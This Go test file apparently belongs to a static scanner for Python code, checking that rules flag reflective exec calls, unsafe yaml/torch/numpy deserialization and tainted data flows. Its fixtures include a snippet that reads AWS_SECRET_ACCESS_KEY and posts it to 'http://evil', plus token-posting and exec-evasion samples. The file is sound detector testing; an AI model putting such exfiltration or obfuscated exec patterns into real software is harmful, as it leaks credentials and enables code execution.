package scout_test

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/skarm/scout"
	"github.com/skarm/scout/internal/scantest"
	scenario "github.com/skarm/scout/internal/scantest/scenarios"
	"github.com/skarm/scout/internal/syntax/frontend"
	"github.com/skarm/scout/report"
)

func TestScannerPythonUsesEvaluatedCallArguments(t *testing.T) {
	if !frontend.BackendFor("python").Available {
		t.Skip("native grammar required")
	}
	options := scout.DefaultOptions()
	options.Profile, options.Checks = scout.Custom, &scout.Checks{Python: true}
	scanner, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	}()
	for _, tc := range []struct {
		name, source string
		want         map[string]int
	}{
		{
			name:   "yaml-direct-safe",
			source: "import yaml\nyaml.load(input(), Loader=yaml.SafeLoader)\n",
			want: map[string]int{
				"PY-AST10": 0,
				"PY-TT6":   0,
			},
		},
		{
			name:   "yaml-mapped-safe",
			source: "import yaml\nloaders = {'safe': yaml.SafeLoader}\nyaml.load(input(), Loader=loaders['safe'])\n",
			want: map[string]int{
				"PY-AST10": 0,
				"PY-TT6":   0,
			},
		},
		{
			name:   "yaml-factory-safe",
			source: "import yaml\ndef loader():\n    return yaml.SafeLoader\nyaml.load(input(), Loader=loader())\n",
			want: map[string]int{
				"PY-AST10": 0,
				"PY-TT6":   0,
			},
		},
		{
			name:   "yaml-mapped-unsafe",
			source: "import yaml\nloaders = {'unsafe': yaml.UnsafeLoader}\nyaml.load(input(), Loader=loaders['unsafe'])\n",
			want: map[string]int{
				"PY-AST10": 1,
				"PY-TT6":   1,
			},
		},
		{
			name:   "torch-direct-safe",
			source: "import torch\ntorch.load(input(), weights_only=True)\n",
			want: map[string]int{
				"PY-AST10": 0,
				"PY-TT6":   0,
			},
		},
		{
			name:   "torch-alias-safe",
			source: "import torch\nweights_only = True\ntorch.load(input(), weights_only=weights_only)\n",
			want: map[string]int{
				"PY-AST10": 0,
				"PY-TT6":   0,
			},
		},
		{
			name:   "torch-alias-unsafe",
			source: "import torch\nweights_only = False\ntorch.load(input(), weights_only=weights_only)\n",
			want: map[string]int{
				"PY-AST10": 1,
				"PY-TT6":   1,
			},
		},
		{
			name:   "numpy-keyword-alias-unsafe",
			source: "import numpy\nallow = True\nnumpy.load(input(), allow_pickle=allow)\n",
			want: map[string]int{
				"PY-AST10": 1,
				"PY-TT6":   1,
			},
		},
		{
			name:   "numpy-positional-alias-unsafe",
			source: "import numpy\nallow = True\nnumpy.load(input(), None, allow)\n",
			want: map[string]int{
				"PY-AST10": 1,
				"PY-TT6":   1,
			},
		},
		{
			name:   "numpy-alias-safe",
			source: "import numpy\nallow = False\nnumpy.load(input(), allow_pickle=allow)\n",
			want: map[string]int{
				"PY-AST10": 0,
				"PY-TT6":   0,
			},
		},
		{
			name:   "vars-direct",
			source: "import builtins\nvars(builtins)['exec'](input())\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-TT5":  1,
			},
		},
		{
			name:   "vars-factory",
			source: "import builtins\ndef module():\n    return builtins\nvars(module())['exec'](input())\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-TT5":  1,
			},
		},
		{
			name:   "vars-assignment-expression",
			source: "import builtins\nvars((module := builtins))['exec'](input())\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-TT5":  1,
			},
		},
		{
			name:   "nested-source-introspection",
			source: "import os\nexec(getattr(os, 'getenv')('TOKEN'))\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-AST8": 1,
			},
		},
		{
			name:   "nested-factory-compiler",
			source: "def compiler():\n    return compile\nexec(compiler()(input(), '<input>', 'exec'))\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-AST6": 1,
				"PY-AST8": 1,
			},
		},
		{
			name:   "import-evaluated-name",
			source: "module_name = 'builtins'\n__import__(module_name).__dict__['exec'](input())\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-TT5":  1,
			},
		},
		{
			name:   "factory-staticmethod",
			source: "def modifier():\n    return staticmethod\nclass C:\n    @modifier()\n    def run(data):\n        exec(data)\nC.run(input())\n",
			want:   map[string]int{"PY-TT5": 1},
		},
		{
			name:   "factory-classmethod",
			source: "def modifier():\n    return classmethod\nclass C:\n    @modifier()\n    def run(cls, data):\n        exec(data)\nC.run(input())\n",
			want:   map[string]int{"PY-TT5": 1},
		},
		{
			name:   "default-evaluated-once",
			source: "flag = True\ndef default():\n    global flag\n    flag = not flag\n    return 0\ndef run(value=default()):\n    pass\nexec(input()) if flag else None\n",
			want: map[string]int{
				"PY-AST1": 0,
				"PY-TT5":  0,
			},
		},
		{
			name:   "base-evaluated-once",
			source: "flag = True\nclass Base:\n    pass\ndef parent():\n    global flag\n    flag = not flag\n    return Base\nclass Child(parent()):\n    pass\nexec(input()) if flag else None\n",
			want: map[string]int{
				"PY-AST1": 0,
				"PY-TT5":  0,
			},
		},
		{
			name:   "file-read-literal-mode",
			source: "exec(open('source', 'r').read())\n",
			want:   map[string]int{"PY-TT2": 1},
		},
		{
			name:   "file-read-evaluated-mode",
			source: "mode = 'r'\nexec(open('source', mode).read())\n",
			want:   map[string]int{"PY-TT2": 1},
		},
		{
			name:   "file-write-evaluated-mode",
			source: "mode = 'w'\nexec(open('source', mode=mode).read())\n",
			want:   map[string]int{"PY-TT2": 0},
		},
		{
			name:   "getattr-key-alias",
			source: "import builtins\nkey = 'exec'\ngetattr(builtins, key)(input())\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-TT5":  1,
				"PY-AST7": 0,
			},
		},
		{
			name:   "getattr-key-factory",
			source: "import builtins\ndef key():\n    return 'exec'\ngetattr(builtins, key())(input())\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-TT5":  1,
			},
		},
		{
			name:   "reflection-key-alias",
			source: "import builtins\nkey = 'exec'\nbuiltins.__dict__.get(key)(input())\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-TT5":  1,
			},
		},
		{
			name:   "subscription-key-factory",
			source: "import builtins\ndef key():\n    return 'exec'\nbuiltins.__dict__[key()](input())\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-TT5":  1,
			},
		},
		{
			name:   "mapping-key-alias",
			source: "actions = {'run': exec}\nkey = 'run'\nactions[key](input())\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-TT5":  1,
			},
		},
		{
			name:   "assignment-key-alias",
			source: "actions = {'run': lambda value: value}\nkey = 'run'\nactions[key] = exec\nactions['run'](input())\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-TT5":  1,
			},
		},
		{
			name:   "getattr-key-bytes",
			source: "import builtins\ngetattr(builtins, b'exec')(input())\n",
			want: map[string]int{
				"PY-AST1": 0,
				"PY-TT5":  0,
				"PY-AST7": 1,
			},
		},
		{
			name:   "subscription-key-bytes",
			source: "import builtins\nbuiltins.__dict__[b'exec'](input())\n",
			want: map[string]int{
				"PY-AST1": 0,
				"PY-TT5":  0,
				"PY-AST7": 1,
			},
		},
		{
			name:   "getattr-key-unknown",
			source: "import builtins\ngetattr(builtins, input())(input())\n",
			want: map[string]int{
				"PY-AST1": 0,
				"PY-TT5":  0,
				"PY-AST7": 1,
			},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			run, err := scanner.Scan(context.Background(), scout.Reader("arguments.py", strings.NewReader(tc.source)))
			if err != nil && !errors.Is(err, scout.ErrIncomplete) {
				t.Fatal(err)
			}
			counts := map[string]int{}
			for _, finding := range run.Targets[0].Analysis.Findings {
				counts[finding.RuleID]++
			}
			for id, want := range tc.want {
				if counts[id] != want {
					t.Errorf("%s=%d, want %d; findings=%v", id, counts[id], want, counts)
				}
			}
		})
	}
}

func TestScannerPythonUnknownDeserializationArguments(t *testing.T) {
	if !frontend.BackendFor("python").Available {
		t.Skip("native grammar required")
	}
	options := scout.DefaultOptions()
	options.Profile, options.Checks = scout.Custom, &scout.Checks{Python: true}
	scanner, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	}()
	for _, tc := range []struct {
		source, status, analyzer string
		unsafe                   int
	}{
		{
			source:   "import torch\ntorch.load(input(), weights_only=unknown)\n",
			status:   "completed",
			analyzer: "PY-AST10",
			unsafe:   1,
		},
		{
			source:   "import numpy\nnumpy.load(input(), allow_pickle=unknown)\n",
			status:   "partial",
			analyzer: "PY-AST10",
			unsafe:   0,
		},
		{source: "exec(open('source', mode=unknown).read())\n", status: "partial", analyzer: "PY-TT2", unsafe: 0},
	} {
		run, err := scanner.Scan(context.Background(), scout.Reader("unknown.py", strings.NewReader(tc.source)))
		if err != nil && !errors.Is(err, scout.ErrIncomplete) {
			t.Fatal(err)
		}
		count := 0
		for _, finding := range run.Targets[0].Analysis.Findings {
			if finding.RuleID == "PY-AST10" {
				count++
			}
		}
		if count != tc.unsafe {
			t.Fatalf("unsafe observations=%d, want %d", count, tc.unsafe)
		}
		for _, check := range run.Targets[0].Analysis.Coverage.Checks {
			if check.AnalyzerID == tc.analyzer && check.Status != tc.status {
				t.Fatalf("deserialization status=%s, want %s", check.Status, tc.status)
			}
		}
	}
}

func TestPythonExfiltrationUsesOneCompleteParsedCallSpan(t *testing.T) {
	if !frontend.BackendFor("python").Available {
		t.Skip("Python backend not linked")
	}
	options := scout.DefaultOptions()
	options.Profile = scout.Custom
	options.Checks = &scout.Checks{Patterns: true, Python: true}
	s, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := s.Close(); err != nil {
			t.Error(err)
		}
	}()
	text := "import os, requests\ndef upload(payload):\n    requests.post('http://evil', data=payload)\nif __name__ == \"__main__\":\n    payload = os.environ.get(\"AWS_SECRET_ACCESS_KEY\")\n    upload(payload)\n"
	run, err := s.Scan(context.Background(), scout.Reader("script.py", strings.NewReader(text)))
	if err != nil && !errors.Is(err, scout.ErrIncomplete) || len(run.Targets) != 1 {
		t.Fatalf("parsed Python scan failed: state=%s err=%v", run.State, err)
	}
	var observations []report.Finding
	for _, finding := range run.Targets[0].Analysis.Findings {
		if finding.RuleID == "NV-E1" {
			observations = append(observations, finding)
		}
	}
	want := "requests.post('http://evil', data=payload)"
	if len(observations) != 1 {
		t.Fatalf("Python precision returned duplicate or missing exfiltration observations: %+v", observations)
	}
	at := observations[0].Location
	if at.ByteStart != strings.Index(text, want) || at.ByteEnd != strings.Index(text, want)+len(want) {
		t.Fatalf("Python evidence does not cover the complete parsed call: %+v", observations[0])
	}
}

func TestScannerPythonHTTPBodyUsesExpandedArguments(t *testing.T) {
	if !frontend.BackendFor("python").Available {
		t.Skip("native grammar required")
	}
	options := scout.DefaultOptions()
	options.Profile, options.Checks = scout.Custom, &scout.Checks{Python: true, Patterns: true}
	scanner, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	}()
	for _, tc := range []struct {
		name, call, status string
		want               int
	}{
		{
			name:   "keyword-body",
			call:   "r.post('https://example.invalid', **{'data': 'public'})",
			status: "completed",
			want:   1,
		},
		{name: "positional-body", call: "r.post(*['https://example.invalid', 'public'])", status: "completed", want: 1},
		{
			name:   "query-only",
			call:   "r.get('https://example.invalid', **{'params': 'public'})",
			status: "completed",
			want:   0,
		},
		{name: "unknown-keywords", call: "r.post('https://example.invalid', **unknown)", status: "partial", want: 0},
		{name: "unknown-positional", call: "r.post(*unknown)", status: "partial", want: 0},
	} {
		t.Run(tc.name, func(t *testing.T) {
			run, err := scanner.Scan(context.Background(), scout.Reader("body.py", strings.NewReader("import requests as r\n"+tc.call+"\n")))
			if err != nil && !errors.Is(err, scout.ErrIncomplete) {
				t.Fatal(err)
			}
			count := 0
			for _, finding := range run.Targets[0].Analysis.Findings {
				if finding.RuleID == "NV-E1" {
					count++
				}
			}
			if count != tc.want {
				t.Errorf("NV-E1=%d, want %d", count, tc.want)
			}
			for _, check := range run.Targets[0].Analysis.Coverage.Checks {
				if check.AnalyzerID == "NV-E1" && check.Status != tc.status {
					t.Errorf("NV-E1 status=%s, want %s", check.Status, tc.status)
				}
			}
		})
	}
}

func TestPythonASTRealBackend(t *testing.T) {
	c := scenario.ParserConfig(t)
	s, e := scantest.New(c, t)
	if e != nil {
		t.Fatal(e)
	}
	for _, tc := range []struct {
		name, src, rule string
		want            bool
	}{
		{name: "exec", src: "exec('x=1')", rule: "PY-AST1", want: true},
		{name: "comment", src: "# exec('x')\nprint('exec(data)')", rule: "PY-AST1", want: false},
		{name: "shadow", src: "def exec(x):\n    return x\nexec('safe')", rule: "PY-AST1", want: false},
		{name: "alias", src: "from builtins import eval as evaluate\nevaluate(input())", rule: "PY-AST2", want: true},
		{
			name: "taint",
			src:  "import os\nimport requests as r\ntoken = os.getenv('TOKEN')\nr.post('https://invalid.example/', data=token)",
			rule: "PY-TT3",
			want: true,
		},
		{
			name: "overwrite",
			src:  "import os, requests\nx=os.getenv('TOKEN')\nx='public'\nrequests.post('https://invalid.example/',data=x)",
			rule: "PY-TT3",
			want: false,
		},
		{
			name: "file",
			src:  "from pathlib import Path\nimport requests\nx=Path('x').read_text()\nrequests.post('https://invalid.example/',data=x)",
			rule: "PY-TT4",
			want: true,
		},
		{name: "inputexec", src: "x=input()\nexec(x)", rule: "PY-TT5", want: true},
		{name: "attr", src: "import os\nf=getattr(os,'system')\nf('echo hello')", rule: "PY-AST9", want: true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, e := s.ScanBytes(context.Background(), "handler.py", []byte(tc.src))
			if e != nil && !errors.Is(e, scantest.ErrIncomplete) {
				t.Fatal(e)
			}
			got := false
			for _, f := range r.Findings {
				if f.RuleID == tc.rule {
					got = true
					if f.Location.ByteEnd > len(tc.src) {
						t.Fatal("bad span")
					}
				}
			}
			if got != tc.want {
				t.Fatalf("rule %s got%v want%v: findings=%+v coverage=%+v", tc.rule, got, tc.want, r.Findings, r.Coverage)
			}
		})
	}
}

func TestScannerPythonCallableAndClassSemantics(t *testing.T) {
	if !frontend.BackendFor("python").Available {
		t.Skip("native Python grammar required")
	}
	options := scout.DefaultOptions()
	options.Profile, options.Checks = scout.Custom, &scout.Checks{Python: true}
	scanner, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	}()
	for _, tc := range []struct {
		name, text string
		flow       int
		complete   bool
	}{
		{name: "direct", text: "f = exec\nf(input())\n", flow: 1, complete: true},
		{name: "argument-rebind", text: "f = exec\nf((f := lambda x: x)(input()))\n", flow: 1, complete: true},
		{
			name:     "mapping-alias",
			text:     "actions = {'run': exec}\nf = actions['run']\nf(input())\n",
			flow:     1,
			complete: true,
		},
		{name: "mapping-call", text: "actions = {'run': exec}\nactions['run'](input())\n", flow: 1, complete: true},
		{
			name:     "factory-call",
			text:     "def get_runner():\n    return exec\nget_runner()(input())\n",
			flow:     1,
			complete: false,
		},
		{
			name:     "reflective-call",
			text:     "import builtins\nbuiltins.__dict__['exec'](input())\n",
			flow:     1,
			complete: true,
		},
		{
			name:     "getattr-captured-module",
			text:     "import builtins\ngetattr(builtins, 'exec', (builtins := lambda x: x))(input())\n",
			flow:     1,
			complete: true,
		},
		{name: "dictionary-order", text: "d = {(f := exec): f(input())}\n", flow: 1, complete: false},
		{name: "class-source", text: "class C:\n    value = input()\nexec(C.value)\n", flow: 1, complete: false},
		{
			name:     "uncalled-class-write",
			text:     "class C:\n    value = input()\ndef never():\n    C.value = 'safe'\nexec(C.value)\n",
			flow:     1,
			complete: false,
		},
		{
			name:     "called-class-write",
			text:     "class C:\n    value = input()\ndef clear():\n    C.value = 'safe'\nclear()\nexec(C.value)\n",
			flow:     0,
			complete: false,
		},
		{
			name:     "inherited-class-write",
			text:     "class Base:\n    value = input()\nclass C(Base):\n    pass\ndef never():\n    Base.value = 'safe'\nexec(C.value)\n",
			flow:     1,
			complete: false,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			run, err := scanner.Scan(context.Background(), scout.Reader("semantics.py", strings.NewReader(tc.text)))
			if err != nil && !errors.Is(err, scout.ErrIncomplete) {
				t.Fatal(err)
			}
			if len(run.Targets) != 1 {
				t.Fatalf("targets=%d", len(run.Targets))
			}
			if (err == nil) != tc.complete || (run.State == "complete") != tc.complete {
				t.Fatalf("state=%s err=%v; complete=%v", run.State, err, tc.complete)
			}
			counts := map[string]int{}
			for _, finding := range run.Targets[0].Analysis.Findings {
				counts[finding.RuleID]++
				if finding.Location.ByteStart < 0 || finding.Location.ByteEnd > len(tc.text) || finding.Location.ByteStart >= finding.Location.ByteEnd {
					t.Fatalf("invalid evidence: %+v", finding.Location)
				}
			}
			if counts["PY-AST1"] != 1 || counts["PY-TT5"] != tc.flow {
				t.Fatalf("findings=%v state=%s", counts, run.State)
			}
		})
	}
}

func TestScannerPythonDefaultAliasesStayWithinExploration(t *testing.T) {
	if !frontend.BackendFor("python").Available {
		t.Skip("native grammar required")
	}
	options := scout.DefaultOptions()
	options.Profile, options.Checks = scout.Custom, &scout.Checks{Python: true}
	scanner, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	}()
	for _, tc := range []struct{ name, setup, definition, read string }{
		{
			name:       "mapping",
			setup:      "class C:\n    config = {'value': input()}\n",
			definition: "def clear(config=C.config):\n    config['value'] = 'safe'\n",
			read:       "C.config['value']",
		},
		{
			name:       "instance",
			setup:      "class Box:\n    pass\nclass C:\n    config = Box()\nC.config.value = input()\n",
			definition: "def clear(config=C.config):\n    config.value = 'safe'\n",
			read:       "C.config.value",
		},
		{
			name:       "bound-method",
			setup:      "class Box:\n    def clear(self):\n        self.value = 'safe'\nclass C:\n    config = Box()\nC.config.value = input()\n",
			definition: "def clear(run=C.config.clear):\n    run()\n",
			read:       "C.config.value",
		},
		{
			name:       "class",
			setup:      "class C:\n    value = input()\n",
			definition: "def clear(cls=C):\n    cls.value = 'safe'\n",
			read:       "C.value",
		},
		{
			name:       "lambda",
			setup:      "class C:\n    config = {'value': input()}\n",
			definition: "def clear(get=lambda: C.config):\n    get()['value'] = 'safe'\n",
			read:       "C.config['value']",
		},
		{
			name:       "nested-call",
			setup:      "class C:\n    config = {'value': input()}\n",
			definition: "def apply(config=C.config):\n    config['value'] = 'safe'\ndef clear():\n    apply()\n",
			read:       "C.config['value']",
		},
		{
			name:       "lambda-default",
			setup:      "class C:\n    config = {'value': input()}\ndef apply(config):\n    config['value'] = 'safe'\n",
			definition: "clear = lambda config=C.config: apply(config)\n",
			read:       "C.config['value']",
		},
	} {
		for _, called := range []bool{false, true} {
			suffix := "uncalled"
			invoke := ""
			want := 1
			if called {
				suffix = "called"
				invoke = "clear()\n"
				want = 0
			}
			t.Run(tc.name+"/"+suffix, func(t *testing.T) {
				source := tc.setup + tc.definition + invoke + "exec(" + tc.read + ")\n"
				run, err := scanner.Scan(context.Background(), scout.Reader("class_default.py", strings.NewReader(source)))
				if err != nil && !errors.Is(err, scout.ErrIncomplete) {
					t.Fatal(err)
				}
				counts := map[string]int{}
				for _, finding := range run.Targets[0].Analysis.Findings {
					counts[finding.RuleID]++
				}
				if counts["PY-TT5"] != want {
					t.Fatalf("default alias closure mismatch: findings=%v wantTT5=%d state=%s", counts, want, run.State)
				}
			})
		}
	}
}

func TestScannerPythonClassStoredCallablesSurviveBranches(t *testing.T) {
	if !frontend.BackendFor("python").Available {
		t.Skip("native grammar required")
	}
	options := scout.DefaultOptions()
	options.Profile, options.Checks = scout.Custom, &scout.Checks{Python: true}
	scanner, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	}()
	for _, tc := range []struct{ name, source, call string }{
		{
			name:   "bound-method",
			source: "class Box:\n    def emit(self, data):\n        exec(data)\nclass C:\n    pass\nobj = Box()\nC.emit = obj.emit\n",
			call:   "C.emit(input())\n",
		},
		{
			name:   "super",
			source: "class Base:\n    def emit(self, data):\n        exec(data)\nclass Derived(Base):\n    pass\nobj = Derived()\nDerived.parent = super(Derived, obj)\n",
			call:   "Derived.parent.emit(input())\n",
		},
	} {
		for _, branch := range []bool{false, true} {
			suffix := "direct"
			conditional := ""
			if branch {
				suffix = "branch"
				conditional = "if condition:\n    pass\n"
			}
			t.Run(tc.name+"/"+suffix, func(t *testing.T) {
				run, err := scanner.Scan(context.Background(), scout.Reader("class_merge.py", strings.NewReader(tc.source+conditional+tc.call)))
				if err != nil && !errors.Is(err, scout.ErrIncomplete) {
					t.Fatal(err)
				}
				counts := map[string]int{}
				for _, finding := range run.Targets[0].Analysis.Findings {
					counts[finding.RuleID]++
				}
				if counts["PY-TT5"] != 1 {
					t.Fatalf("class-store branch merge lost bound receiver/owner: findings=%v state=%s", counts, run.State)
				}
			})
		}
	}
}

func TestScannerPythonMergedBoundReceiverCanBeUnknown(t *testing.T) {
	if !frontend.BackendFor("python").Available {
		t.Skip("native grammar required")
	}
	options := scout.DefaultOptions()
	options.Profile, options.Checks = scout.Custom, &scout.Checks{Python: true}
	scanner, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	}()
	source := "class Base:\n    def emit(self, data):\n        exec(data)\nclass A(Base):\n    pass\nclass B(Base):\n    pass\nclass C:\n    pass\nleft = A()\nright = B()\nC.emit = left.emit\nif condition:\n    C.emit = right.emit\nC.emit(input())\n"
	run, err := scanner.Scan(context.Background(), scout.Reader("class_bound_union.py", strings.NewReader(source)))
	if err != nil && !errors.Is(err, scout.ErrIncomplete) {
		t.Fatal(err)
	}
	counts := map[string]int{}
	for _, finding := range run.Targets[0].Analysis.Findings {
		counts[finding.RuleID]++
	}
	if counts["PY-TT5"] != 1 {
		t.Fatalf("known boundness lost when receiver type becomes unknown: findings=%v state=%s", counts, run.State)
	}
}

func TestScannerPythonReflectiveLoaderAndNestedCompilation(t *testing.T) {
	if !frontend.BackendFor("python").Available {
		t.Skip("native grammar required")
	}
	options := scout.DefaultOptions()
	options.Profile, options.Checks = scout.Custom, &scout.Checks{Python: true}
	scanner, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	}()
	for _, tc := range []struct {
		name, source string
		want         map[string]int
	}{
		{
			name:   "safe-loader",
			source: "import yaml\nyaml.load(input(), Loader=getattr(yaml, 'SafeLoader'))\n",
			want: map[string]int{
				"PY-AST10": 0,
				"PY-TT6":   0,
				"PY-AST7":  0,
			},
		},
		{
			name:   "unsafe-loader",
			source: "import yaml\nyaml.load(input(), Loader=getattr(yaml, 'UnsafeLoader'))\n",
			want: map[string]int{
				"PY-AST10": 1,
				"PY-TT6":   1,
			},
		},
		{
			name:   "dynamic-loader",
			source: "import yaml\nyaml.load(input(), Loader=getattr(yaml, input()))\n",
			want: map[string]int{
				"PY-AST10": 1,
				"PY-TT6":   1,
				"PY-AST7":  1,
			},
		},
		{
			name:   "nested-reflected-compile",
			source: "import builtins\nexec(builtins.__dict__['compile'](input(), '<input>', 'exec'))\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-AST6": 1,
				"PY-AST8": 1,
				"PY-TT5":  1,
			},
		},
		{
			name:   "dynamic-reflected-compile",
			source: "import builtins\nkey = input()\nexec(builtins.__dict__[key](input(), '<input>', 'exec'))\n",
			want: map[string]int{
				"PY-AST1": 1,
				"PY-AST6": 0,
				"PY-AST8": 0,
				"PY-AST7": 1,
			},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			run, err := scanner.Scan(context.Background(), scout.Reader("reflection.py", strings.NewReader(tc.source)))
			if err != nil && !errors.Is(err, scout.ErrIncomplete) {
				t.Fatal(err)
			}
			counts := map[string]int{}
			for _, finding := range run.Targets[0].Analysis.Findings {
				counts[finding.RuleID]++
				if finding.Location.ByteStart < 0 || finding.Location.ByteEnd > len(tc.source) || finding.Location.ByteStart >= finding.Location.ByteEnd {
					t.Fatalf("invalid reflected evidence: %+v", finding.Location)
				}
			}
			for id, want := range tc.want {
				if counts[id] != want {
					t.Errorf("%s=%d, want %d; findings=%v", id, counts[id], want, counts)
				}
			}
		})
	}
}
